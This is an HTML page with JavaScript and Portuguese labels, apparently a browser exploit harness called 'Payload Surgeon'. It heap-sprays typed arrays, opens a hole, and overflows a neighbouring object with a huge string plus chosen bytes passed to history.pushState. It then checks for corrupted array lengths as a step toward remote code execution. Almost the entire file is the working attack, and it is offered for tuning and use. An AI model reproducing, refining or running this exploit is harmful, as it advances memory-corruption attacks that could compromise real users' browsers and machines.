<!DOCTYPE html>
<html>
<head>
    <title>Payload Surgeon: Hex Injector</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .panel { border: 1px solid #004400; padding: 15px; background: #050505; margin-bottom: 20px; }
        .log { height: 300px; overflow-y: scroll; border: 1px solid #333; padding: 10px; background: #111; color: #ccc; }
        button { padding: 10px 20px; cursor: pointer; background: #222; color: #fff; border: 1px solid #555; font-weight: bold; margin: 5px; }
        button:hover { background: #444; border-color: #fff; }
        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 5px; width: 60px; text-align: center; }
        .danger { color: #ff5555; }
        .success { color: #55ff55; font-weight: bold; }
    </style>
</head>
<body>
    <h1>PAYLOAD SURGEON</h1>
    <div class="panel">
        <p>Base Segura: <strong>709518 bytes</strong> ("A")</p>
        <p>Próximos Bytes (O que vai sobrescrever o vizinho):</p>
        
        <div style="display:flex; gap:5px; flex-wrap:wrap;">
            Byte 1: <input type="text" id="b1" value="00" maxlength="2"> (Crítico)
            Byte 2: <input type="text" id="b2" value="00" maxlength="2">
            Byte 3: <input type="text" id="b3" value="00" maxlength="2">
            Byte 4: <input type="text" id="b4" value="00" maxlength="2">
        </div>
        <div style="margin-top:10px;">
            <button onclick="setPreset('null')">Preset: Null (00 00...)</button>
            <button onclick="setPreset('max')">Preset: Max (FF FF...)</button>
            <button onclick="setPreset('fake')">Preset: Fake (00 10 00 00)</button>
        </div>
    </div>

    <button onclick="runTest()" style="width:100%; border-color:#0f0; background:#003300;">INJETAR PAYLOAD CIRÚRGICO</button>

    <div id="logger" class="log">Aguardando injeção...</div>

    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709518; // O número mágico que você descobriu
        const SPRAY_SIZE = 8000;
        const MAGIC_NUM = 0x41414141;

        var spray = [];

        function log(msg, type='') {
            const d = document.createElement('div');
            d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type) d.className = type;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        function setPreset(type) {
            if(type === 'null') { setHex('00','00','00','00'); }
            if(type === 'max') { setHex('FF','FF','FF','FF'); }
            if(type === 'fake') { setHex('00','00','04','01'); } // Tenta forjar um header comum
        }

        function setHex(h1, h2, h3, h4) {
            document.getElementById('b1').value = h1;
            document.getElementById('b2').value = h2;
            document.getElementById('b3').value = h3;
            document.getElementById('b4').value = h4;
        }

        async function runTest() {
            // Pega valores hex
            let h1 = parseInt(document.getElementById('b1').value, 16);
            let h2 = parseInt(document.getElementById('b2').value, 16);
            let h3 = parseInt(document.getElementById('b3').value, 16);
            let h4 = parseInt(document.getElementById('b4').value, 16);

            log("---------------------------------------");
            log(`INICIANDO. Base: ${BASE_SIZE} | Inject: ${h1.toString(16)} ${h2.toString(16)}...`);

            // Limpeza
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 200));
            spray = [];

            // Spray
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM;
                arr[1] = i;
                spray.push(arr);
            }

            // Buraco (Usando 168 ou o valor que você usou para achar 709518)
            // IMPORTANTE: Se você usou outro tamanho de buraco para achar o 709518, mude aqui:
            let holeSize = 173; // << VERIFIQUE SE É O MESMO QUE VOCÊ USOU
            let center = 4000;
            
            for(let i=0; i < holeSize; i++) {
                spray[center + i] = null;
            }

            log("Aguardando GC...");
            await new Promise(r => setTimeout(r, 1000));

            try {
                // Constrói a Base "A"
                let base = new Array(BASE_SIZE + 1).join('A');
                
                // Constrói o Overflow Cirúrgico a partir do Hex
                // String.fromCharCode só funciona bem até 255.
                let overflow = String.fromCharCode(h1, h2, h3, h4);
                
                let payload = base + overflow;

                history.pushState({}, "pwn_" + Date.now(), payload);
                
                checkCorruption(holeSize, center);

            } catch(e) {
                log("ERRO: " + e.message, "danger");
            }
        }

        function checkCorruption(holeUsed, startIdx) {
            let found = false;
            let limit = startIdx + holeUsed + 50;

            for(let i = startIdx + holeUsed; i < limit; i++) {
                if (i >= spray.length) break;
                let arr = spray[i];
                if(arr) {
                    if(arr.length !== 1024) {
                        found = true;
                        reportSuccess(i, "LENGTH", arr.length, arr[0]);
                        return;
                    }
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        reportSuccess(i, "CONTENT", arr.length, arr[0]);
                        return;
                    }
                }
            }
            if(!found) {
                log("Estável (Sem Crash), mas sem corrupção visível.", "success");
                log("Tente mudar os bytes hexadecimais.");
            }
        }

        function reportSuccess(idx, type, len, val) {
            document.body.style.background = "#005500";
            log(`!!! SUCESSO !!! Vizinho [${idx}] modificado!`);
            log(`Novo Length: ${len}`);
            log(`Valor lido: 0x${val.toString(16)}`);
            alert("RCE STEP COMPLETE!");
        }
    </script>
</body>
</html>
